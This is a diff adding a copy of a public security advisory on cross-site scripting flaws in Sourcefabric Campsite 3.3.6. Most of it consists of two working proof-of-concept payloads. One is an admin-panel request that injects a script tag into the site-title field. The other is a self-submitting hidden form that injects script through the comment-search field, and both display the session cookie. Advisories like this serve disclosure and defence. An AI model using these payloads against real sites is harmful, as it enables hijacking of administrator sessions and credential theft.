@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/42107/info
+
+Sourcefabric Campsite is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Sourcefabric Campsite 3.3.6 is vulnerable; prior versions may also be affected.
+
+http://www.example.com/admin/system_pref/do_edit.php?f_campsite_online=Y&f_site_title=Kora"><script>alert(document.cookie)</script>&f_site_metakeywords=11&f_site_metadescription=22&f_cache_enabled=N&f_cache_engine=APC&f_imagecache_lifetime=86400&f_secret_key=1&f_session_lifetime=1400&f_keyword_separator=%2C&f_login_num=3&f_max_upload_filesize=16M&f_smtp_www.example.com=localwww.example.com&f_smtp_port=25&f_editor_image_ratio=100&f_external_subs_management=N&f_use_replication=N&f_db_repl_www.example.com=&f_db_repl_user=&f_db_repl_pass=&f_db_repl_port=3306&f_use_campcaster=N&f_cc_www.example.comname=localwww.example.com&f_cc_www.example.comport=80&f_cc_xrpcpath=%2Fcampcaster%2FstorageServer%2Fvar%2Fxmlrpc%2F&f_cc_xrpcfile=xrLocStor.php&f_template_filter=.*%2C+CVS&save=%D0%A1%D0%BE%D1%85%D1%80%D0%B0%D0%BD%D0%B8%D1%82%D1%8C HTTP/1.1
+
+
+<form action="http://www.example.com/admin/comments/index.php" method="post" name="main" >
+<input type="hidden" name="f_comment_per_page" value="20" >
+<input type="hidden" name="f_comment_search" value='1"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="f_comment_order_by" value="datestamp">
+</form>
+<script>
+document.main.submit();
+</script>
